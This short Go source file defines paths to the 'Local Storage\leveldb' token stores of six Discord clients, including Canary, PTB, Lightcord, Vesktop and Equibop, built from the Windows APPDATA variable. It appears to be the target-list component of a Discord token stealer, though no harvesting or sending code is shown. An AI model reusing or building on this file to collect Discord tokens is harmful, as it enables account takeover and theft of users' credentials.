package main

import "os"

var AppDataPath = os.Getenv("APPDATA")
var LocalAppDataPath = os.Getenv("LOCALAPPDATA")

var DiscordClientPaths = map[string]string{
	"Discord":        AppDataPath + `\Discord\Local Storage\leveldb`,
	"Discord Canary": AppDataPath + `\discordcanary\Local Storage\leveldb`,
	"Discord PTB":    AppDataPath + `\discordptb\Local Storage\leveldb`,
	"Lightcord":      AppDataPath + `\Lightcord\Local Storage\leveldb`,
	"Vesktop":        AppDataPath + `\Vesktop\Local Storage\leveldb`,
	"Equibop":        AppDataPath + `\Equibop\Local Storage\leveldb`,
}
